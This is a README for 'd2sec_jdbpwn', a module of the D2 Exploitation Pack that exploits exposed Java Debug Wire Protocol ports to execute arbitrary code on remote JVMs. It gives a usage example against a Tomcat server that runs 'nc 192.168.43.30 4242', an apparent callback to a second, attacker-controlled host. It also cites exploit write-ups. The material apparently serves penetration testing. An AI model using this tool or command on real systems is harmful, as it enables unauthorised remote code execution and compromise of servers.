D2 Exploitation Pack

Copyright (c) 2007-2014 DSquare Security, LLC
All rights reserved.

License information
---------------------

See the file "LICENSE.txt" for information on the history of this
software, terms & conditions for usage, and a DISCLAIMER OF ALL
WARRANTIES.

Description
-------------

Java Debugging Wire Protocol (JDWP) is the lowlevel protocol used for
communication between a debugger and a Java Virtual Machine (JVM) as outlined
in the Java Platform Debugger Architecture. It is often used to facilitate
remote debugging of a JVM over TCP/IP and can be identified by the initial
protocol handshake ascii string "JDWP-Handshake", sent first by the client and
responded to by the server. 

d2sec_jdbpwn can be used to interact with remote JDWP capable services.
Typically this service runs on TCP port 8000 however it can be found to run on
arbitrary TCP ports and is sometimes found enabled inadvertantly on servers
running Java services. It is possible to use d2sec_jdbpwn to exploit remote
JVM's and execute arbitrary Java code. 

References
-----------

[1] JDWP - Arbitrary Java Code Execution Exploitation 
http://www.exploit-db.com/papers/27179/

[2] Hacking the Java Debug Wire Protocol - or - “How I met your Java debugger”
http://blog.ioactive.com/2014/04/hacking-java-debug-wire-protocol-or-how.html

Usage
------

$ ./run.sh <RHOST> <RPORT> <method> <cmd>
   <method> should be a frequently used method in the target application 
   on the remote server where a breakpoint will be inserted

Ex: (tomcat6)
$ ./run.sh 192.168.43.45 8000 org.apache.catalina.startup.HostConfig.appBase "nc 192.168.43.30 4242"

